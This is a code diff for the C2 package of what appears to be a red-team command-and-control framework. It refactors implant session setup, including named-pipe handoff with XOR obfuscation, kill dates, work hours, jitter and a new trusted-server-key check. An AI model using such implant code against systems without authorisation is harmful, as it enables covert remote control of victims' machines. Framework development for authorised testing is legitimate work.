@@ -22,7 +22,6 @@ import (
 	"context"
 	"net"
 	"os"
-	"strconv"
 	"time"
 
 	"github.com/PurpleSec/logx"
@@ -103,9 +102,10 @@ func ShootContext(x context.Context, p cfg.Profile, n *com.Packet) error {
 	if err != nil {
 		return xerr.Wrap("unable to connect", err)
 	}
-	if n == nil {
+	switch {
+	case n == nil:
 		n = &com.Packet{Device: local.UUID}
-	} else if n.Device.Empty() {
+	case n.Device.Empty():
 		n.Device = local.UUID
 	}
 	n.Flags |= com.FlagOneshot
@@ -149,7 +149,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	}
 	var (
 		y, f   = context.WithTimeout(x, t)
-		v, err = pipe.ListenPerms(pipe.Format(n+"."+strconv.FormatUint(uint64(os.Getpid()), 16)), pipe.PermEveryone)
+		v, err = pipe.ListenPerms(pipe.Format(n+"."+util.Uitoa16(uint64(os.Getpid()))), pipe.PermEveryone)
 	)
 	if err != nil {
 		f()
@@ -163,6 +163,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		if a, e := v.Accept(); e == nil {
 			z <- a
 		}
+		close(z)
 	}()
 	select {
 	case c = <-z:
@@ -180,8 +181,9 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, ErrNoConn
 	}
 	var (
-		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
-		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
+		g = crypto.XOR(n)
+		w = data.NewWriter(crypto.NewXORWriter(g, c))
+		r = data.NewReader(crypto.NewXORReader(g, c))
 		j uint16
 		b []byte
 	)
@@ -212,7 +214,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		}
 		var s *Session
 		if s, err = connectContextInner(x, r, l, p); err == nil {
-			w.WriteUint16(0x4F4B)
+			w.WriteUint16(0x4F4B) // 0x4F4B == 'OK'
 		}
 		c.Close()
 		return s, err
@@ -229,7 +231,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	} else if j == -1 {
 		s.jitter = cfg.DefaultJitter
 	}
-	if k := p.KillDate(); k != nil && !k.IsZero() {
+	if k, ok := p.KillDate(); ok {
 		s.kill = k
 	}
 	if z := p.WorkHours(); z != nil && !z.Empty() {
@@ -252,7 +254,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, ErrNoHost
 	}
 	s.host.Set(h)
-	if err = w.WriteUint16(0x4F4B); err != nil {
+	if err = w.WriteUint16(0x4F4B); err != nil { // 0x4F4B == 'OK'
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Write OK failed: %s", err.Error())
 		}
@@ -265,7 +267,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		}
 		return nil, xerr.Sub("read OK", 0x45)
 	}
-	if c.Close(); k != 0x4F4B { // 0x4F4B == "OK"
+	if c.Close(); k != 0x4F4B { // 0x4F4B == 'OK'
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Bad OK value received.")
 		}
@@ -283,7 +285,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, xerr.Wrap("first Connect", err)
 	}
 	// KeyCrypt: Encrypt first packet
-	o.Crypt(&s.key)
+	o.KeyCrypt(s.keys)
 	// Set an initial write deadline, to make sure that the connection is stable.
 	q.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	if err = writePacket(q, s.w, s.t, o); err != nil {
@@ -293,6 +295,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, xerr.Wrap("first Packet write", err)
 	}
 	o.Clear()
+	o = nil
 	// Set an initial read deadline, to make sure that the connection is stable.
 	q.SetReadDeadline(time.Now().Add(spawnDefaultTime))
 	o, err = readPacket(q, s.w, s.t)
@@ -302,11 +305,17 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		}
 		return nil, xerr.Wrap("first Packet read", err)
 	}
+	// Check server PublicKey here if we have any TrustedKeys set in our profile.
+	// This function checks if the key is empty first as if key support is disabled
+	// this would return false and error anyway, which we don't want.
+	if !s.keys.Empty() && !p.TrustedKey(s.keys.Public) {
+		return nil, xerr.Sub("non-trusted server PublicKey", 0x79)
+	}
 	// KeyCrypt: Decrypt first packet
-	o.Crypt(&s.key)
+	o.KeyCrypt(s.keys)
 	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
 	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
-	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
+	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), newSleeper(s.sleep)
 	if err = receive(&s, nil, o); err != nil {
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): First Receive failed: %s", err.Error())
@@ -358,7 +367,7 @@ func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Pro
 	} else if j == -1 {
 		s.jitter = cfg.DefaultJitter
 	}
-	if k := p.KillDate(); k != nil && !k.IsZero() {
+	if k, ok := p.KillDate(); ok {
 		s.kill = k
 	}
 	if z := p.WorkHours(); z != nil && !z.Empty() {
@@ -386,7 +395,7 @@ func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Pro
 			}
 		}
 	}
-	if s.kill != nil && time.Now().After(*s.kill) {
+	if !s.kill.IsZero() && time.Now().After(s.kill) {
 		if cout.Enabled {
 			s.log.Warning(`[%s] KillDate "%s" is after the current time, exiting!`, s.ID, s.kill.Format(time.UnixDate))
 		}
@@ -397,14 +406,9 @@ func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Pro
 		return nil, xerr.Wrap("unable to connect", err)
 	}
 	s.writeDeviceInfo(infoHello, n)
-	// KeyCrypt: Generate initial key set here, append to the Packet.
+	// KeyCrypt: Generate initial KeyPair here, add the new PublicKey to the details.
 	//           This Packet is NOT encrypted.
-	if s.generateSessionKey(n); cout.Enabled {
-		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details %v.", s.ID, s.key)
-	}
+	s.keySessionGenerate(n)
 	// Set an initial write deadline, to make sure that the connection is stable.
 	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	if err = writePacket(c, s.w, s.t, n); err != nil {
@@ -421,13 +425,17 @@ func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Pro
 	if v == nil || v.ID != SvComplete {
 		return nil, xerr.Sub("first Packet is invalid", 0x42)
 	}
-	if v.Clear(); cout.Enabled {
+	err = s.keySessionSync(v)
+	if v.Clear(); err != nil {
+		return nil, err
+	}
+	if cout.Enabled {
 		s.log.Info(`[%s] Client connected to "%s"!`, s.ID, h)
 	}
 	r, n = nil, nil
 	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
 	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
-	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
+	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), newSleeper(s.sleep)
 	go s.listen()
 	go s.m.(eventer).listen(s)
 	return s, nil
